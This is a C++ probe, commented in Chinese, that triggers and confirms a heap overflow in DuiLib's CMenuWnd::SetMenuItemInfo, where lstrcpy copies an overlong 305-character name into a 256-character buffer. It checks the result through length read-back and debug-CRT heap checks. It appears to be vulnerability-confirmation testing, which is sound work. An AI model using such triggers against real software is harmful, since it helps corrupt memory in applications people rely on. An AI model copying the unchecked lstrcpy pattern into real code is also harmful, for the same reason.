// 探针：CMenuWnd::SetMenuItemInfo 的 lstrcpy 无长度校验（堆溢出）
//
// MenuItemInfo::szName 为 TCHAR[256]，lstrcpy 不做边界检查。
// ASan 无法拦截 kernel32!lstrcpy（未插桩），因此改用两种确定性证据：
//   1) 回读：容量 256 却写入了 N>256 个字符，说明越界写入
//   2) _CrtCheckMemory：调试 CRT 堆校验发现堆块被破坏
#include "StdAfx.h"
#include <cstdio>
#include <string>
#include <crtdbg.h>
#include "Control/UIMenu.h"

int main()
{
    _CrtSetDbgFlag(_CRTDBG_ALLOC_MEM_DF | _CRTDBG_CHECK_ALWAYS_DF);

    DuiLib::CStdStringPtrMap map;
    DuiLib::CMenuWnd::GetGlobalContextMenuObserver().SetMenuCheckInfo(&map);

    const size_t kNameLen = 305;
    std::wstring longName = L"item_" + std::wstring(kNameLen - 5, L'N');

    printf("[probe] writing %zu TCHAR into MenuItemInfo::szName[256]\n", longName.size());
    fflush(stdout);

    DuiLib::MenuItemInfo* info = DuiLib::CMenuWnd::SetMenuItemInfo(longName.c_str(), true);
    if (info == nullptr) {
        printf("[probe] SetMenuItemInfo returned nullptr\n");
        return 0;
    }

    // 证据 1：回读实际写入长度。szName 只有 256 容量，若读到 >256 说明已被越界写入。
    size_t written = ::wcslen(info->szName);
    printf("[probe] capacity=256, strlen(szName)=%zu -> %s\n", written,
           written > 255 ? "OVERFLOW (wrote past capacity)" : "within capacity");

    // 证据 2：调试 CRT 堆校验
    int heapOk = _CrtCheckMemory();
    printf("[probe] _CrtCheckMemory() = %d (%s)\n", heapOk,
           heapOk ? "heap intact" : "HEAP CORRUPTION DETECTED");

    int verdict = (written > 255 && heapOk) ? 2 : 0;
    if (written > 255 && heapOk) {
        printf("[probe] VERDICT: string length proves out-of-bounds write "
               "(heap block not yet flagged)\n");
    } else if (!heapOk) {
        printf("[probe] VERDICT: heap corruption confirmed\n");
    }
    return verdict;
}
